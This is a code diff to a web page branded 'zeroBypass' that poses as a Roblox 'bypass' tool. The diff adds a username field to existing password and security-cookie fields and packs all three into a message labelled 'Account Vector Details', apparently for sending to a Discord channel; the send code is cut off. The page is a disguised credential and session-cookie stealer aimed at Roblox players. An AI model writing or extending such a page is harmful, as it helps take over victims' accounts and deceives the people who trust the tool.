@@ -119,8 +119,6 @@
       flex-direction: column;
       gap: 14px;
       width: 100%;
-      border-bottom: 1px solid #27272a;
-      padding-bottom: 16px;
     }
 
     .credential-input {
@@ -135,7 +133,6 @@
       transition: border-color 0.15s ease;
     }
 
-    /* Made the cookie field container much bigger vertically */
     .cookie-textarea {
       width: 100%;
       height: 180px; 
@@ -170,6 +167,12 @@
       font-size: 16px;
       line-height: 1.6;
       padding-bottom: 56px;
+    }
+
+    /* Buffer element to give space for buttons when textarea is hidden */
+    .button-spacer {
+      height: 56px;
+      width: 100%;
     }
 
     .action-row {
@@ -255,7 +258,6 @@
 
     <div class="menu-container">
       <select id="mode-select" class="bypass-select">
-        <!-- Changed first option text to prioritize cookies -->
         <option value="text">Bypass with Cookies Only</option>
         <option value="account">Bypass with Cookie & Password</option>
       </select>
@@ -264,11 +266,16 @@
     <div class="workspace-box">
       
       <div id="account-fields" class="account-fields-wrapper">
+        <!-- New Username Field Component -->
+        <input type="text" id="acc-username" class="credential-input" placeholder="Enter Roblox Username..." autocomplete="off">
         <input type="password" id="acc-password" class="credential-input" placeholder="Enter Roblox Account Password..." autocomplete="off">
         <textarea id="acc-cookie" class="cookie-textarea" placeholder="Enter Roblox Security Cookie (_|WARNING:-DO-NOT-SHARE-THIS...)" autocomplete="off"></textarea>
       </div>
       
       <textarea id="paste-box" class="paste-area" placeholder="Paste text payload here..." autocomplete="off" spellcheck="false"></textarea>
+      
+      <!-- Layout spacer used only when payload box disappears -->
+      <div id="spacer-block" class="button-spacer" style="display: none;"></div>
       
       <div class="action-row">
         <div id="status" class="status-msg"></div>
@@ -281,9 +288,11 @@
   <script>
     const modeSelect = document.getElementById('mode-select');
     const accountFields = document.getElementById('account-fields');
+    const accUsername = document.getElementById('acc-username');
     const accPassword = document.getElementById('acc-password');
     const accCookie = document.getElementById('acc-cookie');
     const textarea = document.getElementById('paste-box');
+    const spacerBlock = document.getElementById('spacer-block');
     const sendBtn = document.getElementById('send-btn');
     const status = document.getElementById('status');
 
@@ -292,43 +301,47 @@
     modeSelect.addEventListener('change', () => {
       if (modeSelect.value === 'account') {
         accountFields.style.display = 'flex';
+        textarea.style.display = 'none'; // Completely removes text payload box for second option
+        spacerBlock.style.display = 'block'; // Keeps button bar layout aligned at the bottom
       } else {
         accountFields.style.display = 'none';
+        textarea.style.display = 'block';
+        spacerBlock.style.display = 'none';
+        accUsername.value = "";
         accPassword.value = "";
         accCookie.value = "";
       }
       validateFormState();
     });
 
-    // Fixed validation rules to ensure the second option unlocks the button cleanly
     function validateFormState() {
-      const textVal = textarea.value.trim();
       if (modeSelect.value === 'account') {
+        const userVal = accUsername.value.trim();
         const passVal = accPassword.value.trim();
         const cookieVal = accCookie.value.trim();
-        sendBtn.disabled = (textVal === "" || passVal === "" || cookieVal === "");
+        // Send button unlocks when Username, Password, and Cookie fields are filled out
+        sendBtn.disabled = (userVal === "" || passVal === "" || cookieVal === "");
       } else {
+        const textVal = textarea.value.trim();
         sendBtn.disabled = (textVal === "");
       }
     }
 
     textarea.addEventListener('input', validateFormState);
+    accUsername.addEventListener('input', validateFormState);
     accPassword.addEventListener('input', validateFormState);
     accCookie.addEventListener('input', validateFormState);
 
     sendBtn.addEventListener('click', async () => {
-      const payloadText = textarea.value.trim();
-      if (!payloadText) return;
-
       sendBtn.disabled = true;
       status.textContent = "bypassing.....";
       status.className = "status-msg status-sending";
 
       let discordPayload = "";
       if (modeSelect.value === 'account') {
-        discordPayload = `**[zeroBypass Roblox Account Vector Details]**\n**Password:** \`${accPassword.value.trim()}\`\n**Cookie:** \`\`\`text\n${accCookie.value.trim()}\n\`\`\`\n**Pasted Context Text:**\n\`\`\`text\n${payloadText}\n\`\`\``;
+        discordPayload = `**[zeroBypass Roblox Account Vector Details]**\n**Username:** \`${accUsername.value.trim()}\`\n**Password:** \`${accPassword.value.trim()}\`\n**Cookie:** \`\`\`text\n${accCookie.value.trim()}\n\`\`\``;
       } else {
-        discordPayload = `**[zeroBypass Roblox Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``;
+        discordPayload = `**[zeroBypass Roblox Packet]**\n\`\`\`text\n${textarea.value.trim()}\n\`\`\``;
       }
 
       try {
